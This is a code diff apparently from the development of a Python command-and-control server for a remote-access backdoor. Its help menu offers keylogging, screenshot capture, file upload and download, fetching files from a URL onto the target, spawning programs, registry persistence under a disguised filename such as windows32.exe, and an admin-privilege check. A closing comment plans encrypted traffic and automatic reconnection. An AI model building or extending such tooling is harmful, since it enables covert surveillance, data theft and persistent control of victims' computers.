@@ -1,3 +1,5 @@
+#possible dependency
+import datetime
 import socket
 import termcolor    #pip install termcolor
 import pyautogui    #pip install pylance
@@ -67,12 +69,21 @@ def server_help_manual():
     cd *Directory name*                 --> Changes Directory On Target System
     upload *file name*                  --> Upload File To The Target Machine From Working Dir 
     download *file name*                --> Download File From Target Machine
+    get *url*                           --> Download File From Specified URL to Target ./
     keylog_start                        --> Start The Keylogger
     keylog_dump                         --> Print Keystrokes That The Target From taskmanager.txt
     keylog_stop                         --> Stop And Self Destruct Keylogger File
-    persistence *RegName* *filename*    --> Create Persistence In Registry
     screenshot                          --> Takes screenshot and sends to server ./screenshots/
+    start *programName*                 --> Spawn Program Using backdoor e.g. 'start notepad'
     remove_backdoor                     --> Removes backdoor from target!!!
+    
+    ===Windows Only===
+    persistence *RegName* *filename*    --> Create Persistence In Registry
+                                            copies backdoor to ~/AppData/Roaming/filename
+                                            example: persistence Backdoor windows32.exe
+    check                               --> Check If Has Administrator Privileges
+
+
     \n''')
 
 def c2_help_manual():
@@ -122,7 +133,6 @@ def accept_connections():
             targets.append(target)
             ips.append(ip)
             print(termcolor.colored(str(ip) + ' has connected!', 'green'))
-            #print('[**] Command & Control Center: ', end = '\r')
         except:
             pass
 
@@ -267,3 +277,14 @@ while True:
     except ValueError as e:
         print(termcolor.colored('[!!] ValueError: ' + str(e), 'red'))
         continue 
+
+
+"""
+Possibly improvements
+
+-Consider encrypting the connection using custom (AES128-GCM-DH-SHA256) or HTTPS (lots of traffic w/ HTTP)
+-Implement a 'pulse' feature between server and backdoor (Keep alive):
+
+This will ensure if server.py crashes the backdoor will after 60s will realise server is not listen on socket 
+and will attempt to run connection() function again.
+"""
